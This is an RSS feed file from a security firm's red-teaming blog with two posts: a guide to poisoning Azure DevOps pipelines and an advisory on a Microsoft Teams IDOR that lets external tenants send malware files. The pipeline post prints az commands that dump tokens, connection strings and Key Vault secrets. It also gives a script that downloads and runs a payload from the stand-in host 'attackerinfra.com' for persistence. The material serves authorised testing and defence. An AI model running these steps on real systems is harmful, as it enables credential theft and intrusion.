@@ -1,0 +1,402 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JUMPSEC – Red-Teaming</title>
+    <link>//localhost:1313/tags/red-teaming/</link>
+    <description>Recent content in Red-Teaming on JUMPSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-GB</language>
+    <lastBuildDate>Thu, 09 May 2024 00:00:00 +0000</lastBuildDate>
+    
+	  <atom:link href="//localhost:1313/tags/red-teaming/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>Poisoning Pipelines: Azure DevOps Edition</title>
+      <link>//localhost:1313/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/</link>
+      <pubDate>Thu, 09 May 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/pipelinebursting2.gif&#34; title=&#34;pipelinebursting2&#34; alt=&#34;pipelinebursting2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;pipelinebursting2&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the ever-evolving realm of cloud services, organisations are ditching the headaches of physical infrastructure management and diving headfirst into the possibilities of cloud platforms. From the humble beginnings of deploying virtual machines and servers, we now find ourselves in a dynamic space with everything from serverless architectures to cloud-based active directories, seamless SaaS integrations, architectural blueprints, collaboration tools, AI assistants, and more.&lt;/p&gt;
+&lt;p&gt;However, one core business service has been housed in the cloud longer than most: Continuous Integration / Continuous Deployment (CI/CD). The reasons are clear: there is no better use case for high availability containerised and serverless operations than a CI/CD pipeline.&lt;/p&gt;
+&lt;p&gt;From a red teamer&amp;rsquo;s perspective CI/CD pipelines are also extremely valuable targets as they often underpin the production code base that, in most cases, underpins the organisation&amp;rsquo;s core business function itself. As such, many of the cloud-native red team engagements that we deliver will focus on the compromise of the CI/CD as one of the engagement objectives.&lt;/p&gt;
+&lt;p&gt;This blog summarises some of our thinking with regards to compromising DevOps pipelines on your red team engagements. For now we will be focusing on Azure DevOps due to the fact that historically the majority of our work has been in Azure environments, but we are seeing more and more AWS and GCP estates now too so we may release future versions of this. That being said, the philosophy behind compromising CI/CD and attack scenarios mentioned in this article are common across the board.&lt;/p&gt;
+&lt;h3&gt;Azure DevWho?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure-devwho&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#azure-devwho&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Azure DevOps is a Microsoft toolkit running in the cloud, aimed at streamlining the process of creating software using a CI/CD model. It bundles services for tracking work, managing code, automating builds and tests, and sharing software packages. But more importantly, &lt;strong&gt;it runs user-defined code&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3&gt;Initial Foothold&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-foothold&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#initial-foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Once a foothold in the cloud tenant has been established via phishing, compromising an external application or assumed breach, the standard cyber kill-chain can be followed to enumerate services, move laterally, escalate privileges and mine data.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/cloud_killchain.png&#34; title=&#34;Your favourite cloud killchain diagram&#34; alt=&#34;Your favourite cloud killchain picture&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Your favourite cloud killchain diagram&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Using tools like Road Tools, AzureHound, msportals.io and the Azure CLI you may begin the discovery process to identify what services are in use. Crucially, keep your eyes open for DevOps services.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/msportals.png&#34; title=&#34;msportals.io - you can look up any microsoft portal from here&#34; alt=&#34;msportals.io - you can look up any microsoft portal from here&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;msportals.io - you can look up any microsoft portal from here&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;You may find that in some cases that permissions to Azure DevOps are not as locked down as you might expect. This is ultimately due to how complex granular IAM permissions can become in larger cloud estates. For example, we have found lower privileged users had write permissions to certain non-production pipelines despite not being in technical roles.&lt;/p&gt;
+&lt;h3&gt;But…Least Privilege?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;butleast-privilege&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#butleast-privilege&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Although not part of their day-to-day tasks, users that are not strictly developers may still present no restrictions in modifying, creating, deploying and executing code within the Azure DevOps pipeline. This behaviour is often not intentional but the result of overlooked permission assignments. In fact, over privileged IAM assignments is something that we regularly see in cloud environments due to the sheer number of IAM roles available. Critical permissions such as these are often overlooked, leading to users having the capability to read historical code commits, sometimes going back a few years! These can be a treasure trove for us red teamers as security may have been less of a priority back then and you may be more likely to find hardcoded credentials in older code.&lt;/p&gt;
+&lt;p&gt;If you find yourself having successfully phished a member of staff that has access to Azure DevOps, review the permissions that users have to DevOps services offered by Azure. Your first thoughts at this stage should be to check whether you can:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;edit repositories&lt;/li&gt;
+&lt;li&gt;read history of commits (a treasure trove, believe me) or previously pushed code repositories&lt;/li&gt;
+&lt;li&gt;enumerate other Azure services the organisation is using&lt;/li&gt;
+&lt;li&gt;steal service accounts or managed identities associated with the DevOps service&lt;/li&gt;
+&lt;li&gt;possibly introduce malware to the pipeline to enable more lateral movement and privilege escalation techniques&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Pipeline Runners&lt;span class=&#34;absolute -mt-20&#34; id=&#34;pipeline-runners&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pipeline-runners&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Code checking agents are regularly used in CI/CD pipelines as part of the build process to ensure that the supplied code is running correctly and works as intended. They are compute resources with agent software installed that run tests on your code. They ensure that the infrastructure, resources, and dependencies required to run your code are present. Crucially, they can be seen as ephemeral virtual machines from the attacker perspective.&lt;/p&gt;
+&lt;p&gt;If you find yourself in a position where you can push code to a pipeline, you are now in a position to poison it. Remember, pipeline running agents execute arbitrary &lt;em&gt;user-supplied code.&lt;/em&gt; That smells like RCE to me! Note, pushing arbitrary code to operational pipelines is not the play here. Instead, try to create your own branch or look for test branches. Always clear this with the client before proceeding! It’s important that we stress this point because at this stage you will need to proceed with extra caution as you may be interfering with production services. So please, if you are on an engagement, ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;⚠️  &lt;em&gt;always ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Where you go from here is limited only by your creativity. In our case, we use these RCEs to reach out to attacker-controlled infrastructure and pull down a C2 implant suitable for the target architecture. As a bonus, these machines rarely have security products on them as they are ephemeral by nature (we’ll get to how to maintain persistent access to these machines later)&lt;/p&gt;
+&lt;p&gt;Now this may start to feel more like a traditional red team, but unlike a traditional red team your focus should be on compromising the identity of that agent. That is to say, you can try to steal the pipeline agent’s identity used by Azure, or any other cloud provider for that matter. These will often have service principal identities associated with them in Azure to perform actions.&lt;/p&gt;
+&lt;p&gt;Some options with regards to stealing the tokens include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Requesting the tokens using az cli (from the perspective of the code agent).&lt;/li&gt;
+&lt;li&gt;Metadata service&lt;/li&gt;
+&lt;li&gt;Environment variables&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The above can be achieved by either entering the code in the code commit or by obtaining a reverse shell from the ephemeral virtual environment used by the code running agent.&lt;/p&gt;
+&lt;p&gt;Having now compromised that service principal, it should be easy to review whether they have read/write permissions over other services in Azure resource manager (ARM).&lt;/p&gt;
+&lt;p&gt;To summarise, if you can write to the repository code that is run by the code running agents, you can leverage the agent’s service principal identity to enumerate resources within the Azure environment as them, and mostly undetected.&lt;/p&gt;
+&lt;p&gt;If this works, it would effectively mean pivoting from your initial Azure user identity to a service principal identity for lateral movement.&lt;/p&gt;
+&lt;p&gt;Now what do you do? Well, below we will explore different options here such as automating the process of discovering assets like storage accounts, keyvaults, CosmosDB databases, and so on.&lt;/p&gt;
+&lt;h3&gt;The path to El-Dorado&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-path-to-el-dorado&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#the-path-to-el-dorado&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Having now compromised the identity associated with a code checking agent you can start looking for ways to escalate privileges, move laterally or demonstrate business impact. My favourite approach would be to steal credentials and connection strings to find a route to more business critical environments.&lt;/p&gt;
+&lt;p&gt;In previous engagements we have used this to retrieve:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Access and Refresh Tokens.&lt;/li&gt;
+&lt;li&gt;Environmental variables belonging to the code build running agent.&lt;/li&gt;
+&lt;li&gt;Storage Account connection strings.&lt;/li&gt;
+&lt;li&gt;CosmosDB and Mongo databases and their connection strings.&lt;/li&gt;
+&lt;li&gt;Keyvaults and the secrets they stored.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Wondering what this might look like in real terms? The following are some code examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Enumerate the service principal account and fetch tokens.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;az account list
+echo &amp;#34;----Collecting Tokens-----&amp;#34;
+echo token
+az account get-access-token
+echo aadgraphtoken
+az account get-access-token --resource-type aad-graph
+echo armtoken
+az account get-access-token --resource-type arm
+echo batchtoken
+az account get-access-token --resource-type batch
+echo datalake token
+az account get-access-token --resource-type data-lake
+echo ms-graphtoken
+az account get-access-token --resource-type ms-graph&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;And the above list can continue with pretty much any Azure cloud enumeration command you can think of afterwards…obviously, you can also install new tools and execute them in this context.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Iterate through resources to fetch their connection strings to be used with Azure Storage Explorer or Azure Data Studio.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Ensure you install jq with sudo apt install jq -y
+# Find storage accounts
+az storage account list | jq &amp;#34;.[].name&amp;#34; | awk &amp;#34;{print $1}&amp;#34; | xargs -I % sh -c &amp;#34;{ az storage account show-connection-string -n %; sleep 7;}&amp;#34; | jq &amp;#34;.connectionString&amp;#34;
+
+#Find cosmosdb
+az cosmosdb list | jq &amp;#34;.[].name&amp;#34; | awk &amp;#34;{print $1}&amp;#34; | xargs -I % sh -c &amp;#34;{ az cosmosdb list-connection-strings -n % --resource-group ; sleep 7;}&amp;#34; | jq &amp;#34;.connectionString&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Enumerate and fetch secrets from keyvaults.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Show secrets names
+az keyvault secret list --include-managed --vault-name &amp;#34;vault-name&amp;#34; --maxresults 25
+
+# Show secrets&amp;#39;secret values :)
+az keyvault secret show --vault-name vault-name --name &amp;#34;secrets-name&amp;#34; | jq &amp;#39;.value&amp;#39; | tr -d &amp;#39;&amp;#34;&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Download and execute malware, and sleep indefinitely to ensure the beacon is not killed. This is how you can maintain persistent access to an otherwise ephemeral box.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Fetch the payload from attackerinfra.com
+curl -k -X $&amp;#39;GET&amp;#39; \
+-H $&amp;#39;Host: attackerinfra.com&amp;#39; -H $&amp;#39;Sec-Ch-Ua: \
+&amp;#34;Not A(Brand\&amp;#34;;v=\&amp;#34;24\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;110\&amp;#34;&amp;#39; -H $&amp;#39;Sec-Ch-Ua-Mobile: ?0&amp;#39; -H $&amp;#39;Upgrade-Insecure-Requests: 1&amp;#39; [...] -H $&amp;#39;Connection: close&amp;#39; \
+$&amp;#39;https://attackerinfra.com/MailDriverIntegration&amp;#39; &amp;gt; /home/agentuser/MailDriverIntegration
+
+# Execute the malware
+chmod &amp;#43;x /home/agentuser/MailDriverIntegration
+sudo /home/agentuser/MailDriverIntegration &amp;amp; disown
+
+# Sleep indefinitely
+while [ 1 ]; do sleep 3; echo &amp;#34;test&amp;#34;; done;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;In the past, these commands and techniques have given us unfettered access to a plethora of information and data. At times, this was sensitive business data that could demonstrate that damage could be done even with non-dev accounts in the cloud, which are usually less protected for ease of access. Clearly, this is a reason to extend security best practices to all the departments in an organisation.&lt;/p&gt;
+&lt;h3&gt;The man in the high castle&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-man-in-the-high-castle&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#the-man-in-the-high-castle&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By now you should hopefully have a decent amount of data, tokens and files to sift through (if not make sure you’ve looked through all accessible storage accounts). Some of the most juicy files you may find in DevOps environments are .tf files. These may be more common than you might expect as DevOps engineers and developers often make use of Terraform and Infrastructure as Code (IaC). If you come across these in your cloud red teaming engagement, you may have hit the jackpot.&lt;/p&gt;
+&lt;p&gt;For those not familiar with these files, they contain the configuration and state information for infrastructure managed by Terraform, a popular infrastructure as code (IaC) tool, often used in DevOps. Terraform uses these state files to keep track of the infrastructure it manages, ensuring that it can update or delete resources automatically. This data is crucial as it includes sensitive information such as configuration details, encryption keys, API keys, and possibly credentials that are needed to manage the infrastructure components.&lt;/p&gt;
+&lt;p&gt;Essentially, these files are a blueprint of the entire infrastructure&amp;rsquo;s architecture and contain all the necessary details to replicate or manipulate the environment. The exploration of such cloud storage can lead to the retrieval of service account credentials used to push code  to sometimes critical environments (i.e. &lt;strong&gt;&lt;em&gt;production&lt;/em&gt;&lt;/strong&gt;).&lt;/p&gt;
+&lt;p&gt;Once you are able to steal a higher privileged set of credentials (double points if it was a service principal), you can consider re-running the same techniques as mentioned before to access new and more critical assets.&lt;/p&gt;
+&lt;p&gt;Leveraging the above techniques in client environments we have succeeded in completing attack paths that have led from non-technical staff being able to move laterally and escalate privileges all the way to being able to push code to the production CI/CD pipeline! This would effectively represent a significant vantage point and positioning for a malicious actor, who can carry out disruptive attacks that may halt business operations, deny services to employees and customers, exfiltrate valuable intellectual property and possibly wipe off or alter any data in Azure for extortion purposes.&lt;/p&gt;
+&lt;h3&gt;Lessons learned&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lessons-learned&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lessons-learned&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The fascinating exploration of the cloud world and its wonders serves as a reminder to us all of the necessity of striking a balance between the convenience of cloud adoption and the critical need for robust security practices. Some observations and takeaways stemming from our experience are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;If possible, restrict commit history and code deployment logs read access to administrators only when using Azure DevOps.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Limit code access in your pipeline to authorised devs only, who can read, write, pull, and push. Keeping an eye on access roles, especially for project manager accounts or non-techie accounts (usually lacking MFA, and generally less protected than devs’ accounts), is crucial for maintaining operational integrity and preventing abuses.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Implement granular firewall and access control rules (RBAC) at the resource group level to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;enforce strict separation of the SDLC environments.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;restrict access to resources (storage accounts, key vaults, and databases) to only authorised users, machines and/or IP addresses.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Protect your &lt;em&gt;tfstate&lt;/em&gt; files as if they were passwords! Credentials and connection strings can easily lay in there!&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Review if service principals are adhering to the policy of least privileged access, even for seemingly benign ephemeral code checking agents.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Always consider defence-in-depth and integrating security to your DevOps processes and environments.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If you got here, thank you for reading and I hope this inspired you to look after your cloud DevOps environment a bit more thoroughly! :)&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Advisory: IDOR in Microsoft Teams Allows for External Tenants to Introduce Malware</title>
+      <link>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</link>
+      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</guid>
+      <description>
+        
+        
+        &lt;h3&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#tldr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Max Corbridge (@CorbridgeMax) and Tom Ellson (@tde_sec) of JUMPSEC’s Red Team recently discovered a vulnerability in the latest version of Microsoft Teams which allows for the possible introduction of malware into any organisations using Microsoft Teams in its default configuration. This is done by bypassing client-side security controls which prevent external tenants from sending files (malware in this case) to staff in your organisation. JUMPSEC has detailed remediation options, as well as some detection opportunities. &lt;/p&gt;
+&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Introducing malware into target organisations is becoming increasingly difficult. Many of the traditional payload types (.exe, Office Macros, etc) are now heavily-scrutinised or have been proactively addressed to reduce their &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;efficacy&lt;/em&gt;&lt;/a&gt;. Similarly, payload delivery avenues such as phishing are becoming increasingly monitored and secured to reduce the ease with which threat actors’ malware can reach end-user devices. Mail security controls, IP blocklists, domain reputation, email HTML, content inspection, third-party mail security products, URL filtering and many more must be bypassed for a phishing campaign to traverse all anti-phishing security controls and land in a target’s inbox. &lt;/p&gt;
+&lt;p&gt;As such, threat actors and red teams alike are looking for newer and potentially overlooked avenues of payload delivery. One such novel avenue is Microsoft Teams External Tenants. Organisations that use Microsoft Teams (91% of the Fortune 100 according to &lt;a href=&#34;https://www.linkedin.com/pulse/91-fortune-100-companies-use-teams-techbanditshack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;this article&lt;/em&gt;&lt;/a&gt;) inherit Microsoft’s default configuration which allows users from outside of their organisation to reach out to their staff members. By allowing this, an entirely new avenue of social engineering (and now payload delivery as this blog will explain) is created.&lt;/p&gt;
+&lt;h3&gt;Detail&lt;span class=&#34;absolute -mt-20&#34; id=&#34;detail&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#detail&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft Teams allows any user with a Microsoft account to reach out to ‘external tenancies’. Here, external tenancies can be thought of as any business or organisation using Microsoft Teams. These organisations each have their own Microsoft tenancy, and users from one tenancy are able to send messages to users in another tenancy. When doing so, an ‘External’ banner appears alongside the name as seen below. &lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19671&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;391&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/external.png&#34; title=&#34;External banner on incoming message&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;External banner on incoming message&lt;/figcaption&gt;
+  &lt;/figure&gt; External banner applied to incoming message requests[/caption]&lt;/p&gt;
+&lt;p&gt;As someone who spent a long time doing purely social engineering (phishing, vishing, smshing, etc.) this is not a show stopper by any means. In my experience, whilst this banner (and the subsequent pop-up) may deter a handful of targets, there is still a significant percentage of staff that would click on a message from an external tenant and accept the subsequent warning that the user is ‘external’. In fact, this was proven only last month, as the techniques used in this blog post were successfully used to gain an initial foothold in a client’s environment as part of a red team engagement. This is especially true if the malicious party is impersonating a known member of your organisation, and has purchased and registered a brand-impersonation domain as red teams often do.&lt;/p&gt;
+&lt;p&gt;When messaging staff in another organisation you are blocked from sending files to them, unlike with members of your own tenancy. See below the difference:&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19672&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1496&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/1.png&#34; title=&#34;Messaging a member of the same organisation&#34; alt=&#34;Messaging a member of the same organisation &#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Messaging a member of the same organisation&lt;/figcaption&gt;
+  &lt;/figure&gt; Messaging a member of the same organisation[/caption]&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19673&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1421&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/2.png&#34; title=&#34;Restrictions when messaging someone in a different organisation&#34; alt=&#34;Restrictions when messaging someone in a different organisation&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Restrictions when messaging someone in a different organisation&lt;/figcaption&gt;
+  &lt;/figure&gt; Restrictions when messaging someone in a different organisation[/caption]&lt;/p&gt;
+&lt;p&gt;So far, this is nothing new. However, having leveraged this social engineering avenue in the past I began wondering if this security control could be bypassed to allow for seamless delivery of payloads directly into a target&amp;rsquo;s inbox on our red team engagements. I began looking online, and articles &lt;a href=&#34;https://aadinternals.com/post/teams-policies/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;like this&lt;/em&gt;&lt;/a&gt; suggested that certain security controls are actually implemented client-side in Microsoft Teams.&lt;/p&gt;
+&lt;p&gt;I raised this with JUMPSEC’s Head of Offensive Security (Tom Ellson) and no more than 10 minutes later we had bypassed the security control and were able to send files into a target organisation. Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request, usually here:&lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;/v1/users/ME/conversations/&amp;lt;RECIPIENT_ID&amp;gt;/messages &lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19674&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1429&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;3&lt;/figcaption&gt;
+  &lt;/figure&gt; Payload delivered directly into a target inbox[/caption]&lt;/p&gt;
+&lt;p&gt;When sending the payload like this, it is actually hosted on a Sharepoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link. &lt;/p&gt;
+&lt;p&gt;Having identified the issue, I wanted to validate that this vulnerability would work as intended as an avenue for payload delivery into a target organisation, and not fall short for some unknown reason when used in a mature client environment. As such, last month I used this vulnerability to deliver our red team C2 (malware) payload directly into a target inbox to gain our initial foothold on a covert red team engagement. This allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys. &lt;/p&gt;
